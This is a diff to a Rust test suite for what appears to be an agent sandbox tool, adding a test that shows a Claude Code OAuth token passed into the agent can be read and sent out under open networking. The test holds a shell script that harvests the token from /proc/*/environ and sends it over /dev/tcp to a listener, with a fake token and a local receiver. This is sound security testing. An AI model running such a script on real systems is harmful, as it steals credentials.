@@ -2396,6 +2396,7 @@ fn a_run_starts_its_share_servers_and_cleanup_without_a_hidden_secret_s_variable
 // spec(AUTH): On your host, `ap` reads `CLAUDE_CODE_OAUTH_TOKEN` like any secret and passes it through untouched, so the agent can read it.
 // spec(AUTH): | `token` | With a subscription token from your host. Claude Code only | The token |
 // spec(AUTH): **`AUTH token`** uses a subscription token you created, such as one from `claude setup-token`.
+// spec(AUTH): With Claude Code, `AUTH token` works too.
 #[test]
 fn auth_token_hands_the_harness_its_token() {
     let scratch = Scratch::new("auth-token");
@@ -2413,6 +2414,43 @@ fn auth_token_hands_the_harness_its_token() {
     assert_eq!(built.status.code(), Some(1), "{built:?}");
     let stderr = String::from_utf8_lossy(&built.stderr);
     assert!(stderr.contains("`token`"), "{stderr}");
+}
+
+// spec(AUTH): With `AUTH login` or `AUTH token`, any code in the agent, including plugin code, can read the credential and send it anywhere the agent can reach.
+// spec(AUTH): Under `NETWORK +`, it is anywhere.
+#[test]
+fn under_network_plus_code_in_the_agent_can_send_the_token_anywhere() {
+    let scratch = Scratch::new("auth-token-anywhere");
+    scratch.build(
+        "open",
+        "AGENT claude:0.0.0\nOS minimal\nNETWORK +\nENV FAKE_HARNESS_SLEEP 300\nAUTH token\n",
+    );
+    // This host's address on its route out stands for anywhere: no rule
+    // names it.
+    let address = t1::outward_address();
+    let listener = std::net::TcpListener::bind((address, 0)).unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let (heard, hear) = std::sync::mpsc::channel();
+    thread::spawn(move || {
+        let (mut stream, _) = listener.accept().unwrap();
+        let mut got = String::new();
+        let _ = stream.read_to_string(&mut got);
+        let _ = heard.send(got);
+    });
+    let token = "sk-ant-oat01-token-6b2e";
+    let (run, name, _) = start_reporting(&scratch, "open", &[("CLAUDE_CODE_OAUTH_TOKEN", token)]);
+    // A program other than the harness reads the token, as any process in
+    // the agent can, and sends it out.
+    let script = format!(
+        "token=$(cat /proc/[0-9]*/environ 2>/dev/null | tr '\\0' '\\n' \
+         | grep -m1 '^CLAUDE_CODE_OAUTH_TOKEN=')\n\
+         timeout 20 bash -c 'exec 3<>/dev/tcp/{address}/{port} && printf \"%s\\n\" \"$0\" >&3' \"$token\"\n"
+    );
+    let sent = scratch.exec(&name, &["bash", "-c", &script], b"");
+    assert_eq!(sent.status.code(), Some(0), "{sent:?}");
+    let got = hear.recv_timeout(Duration::from_secs(30)).unwrap();
+    assert_eq!(got, format!("CLAUDE_CODE_OAUTH_TOKEN={token}\n"));
+    drop(run);
 }
 
 // spec(AUTH): With Claude Code, the run's `~/.claude.json` approves the placeholder, so an interactive run doesn't ask whether to use the key.
